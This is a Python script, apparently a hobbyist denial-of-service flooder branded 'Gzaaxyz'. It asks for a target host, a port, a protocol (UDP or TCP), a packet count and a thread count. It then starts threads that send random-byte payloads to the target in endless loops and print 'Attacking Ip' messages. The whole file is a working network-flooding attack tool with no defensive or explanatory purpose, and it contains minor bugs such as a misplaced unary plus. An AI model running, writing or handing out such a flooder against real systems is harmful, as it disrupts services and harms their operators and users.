import random
import socket
import threading
import time
import os,sys

os.system("clear")
print("""\033[91m
░██████╗░███████╗░█████╗░░█████╗░██╗░░██╗██╗░░░██╗
██╔════╝░╚════██║██╔══██╗██╔══██╗╚██╗██╔╝╚██╗░██╔╝
██║░░██╗░░░███╔═╝███████║███████║░╚███╔╝░░╚████╔╝░
██║░░╚██╗██╔══╝░░██╔══██║██╔══██║░██╔██╗░░░╚██╔╝░░
╚██████╔╝███████╗██║░░██║██║░░██║██╔╝╚██╗░░░██║░░░
░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░\033[91m""")
print("\033[31m━━━ Kenal Gzaaxyz? (y/n)")
choice = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ (UDP/TCP)")
choice = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Host/IP")
ip = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Port")
port = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Pakets")	
print("\033[31m━━━ Min Pakets 100")
times = int(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Threads")
print("\033[31m━━━ Min Threads 100")
threads = int(input("┗━━━━━━>\033[0m:"))
def udp():
	data = random._urandom(900)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[91m 𝙂𝙯𝙖𝙖𝙭𝙮𝙯 Attacking Ip %s \033[91m And Port %s"%(ip,port))
		except:
			print("\033[91m Server %s Has Been Maintenance %s"%(ip,port))
def tcp():
	data = random._urandom(3016)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			s.close()
			print("\033[91m  𝙂𝙯𝙖𝙖𝙭𝙮𝙯 Attacking Ip %s And Port %s"%(ip,port))

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()